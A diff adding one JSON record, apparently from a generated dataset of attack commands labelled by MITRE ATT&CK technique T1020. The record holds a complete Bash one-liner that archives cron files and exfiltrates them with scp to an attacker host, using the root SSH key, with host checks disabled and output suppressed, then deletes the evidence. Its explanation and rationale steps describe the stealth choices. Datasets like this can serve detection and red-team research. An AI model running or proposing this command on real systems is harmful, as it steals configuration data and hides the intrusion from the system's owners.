@@ -1,0 +1,23 @@
+{
+  "technique_id": "T1020",
+  "platform": "Linux",
+  "shell": "Bash",
+  "command": "ts=$(date +%s); tar -czf /tmp/cron_${ts}.tgz /etc/crontab /etc/cron* /var/spool/cron >/dev/null 2>&1 && scp -q -C -i /root/.ssh/id_rsa -P 22 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null /tmp/cron_${ts}.tgz attacker@198.51.100.10:/var/tmp/.cache/sched/ >/dev/null 2>&1 && rm -f /tmp/cron_${ts}.tgz",
+  "explanation": "Packages system and user cron configurations to profile task scheduling and exfiltrates them via scp quietly, cleaning up artifacts afterward.",
+  "rationale_steps": [
+    "Collect cron-related files from standard system and user locations.",
+    "Compress into a single archive to limit transfer operations.",
+    "Use scp with identity file and disabled host checks for automated exfiltration.",
+    "Suppress output and delete the temporary archive to reduce visibility."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1020-e93662d8-d8537a80",
+  "source_prompt_hash": "e93662d8",
+  "timestamp_utc": "2025-09-30T09:01:25.255647Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judge": null,
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
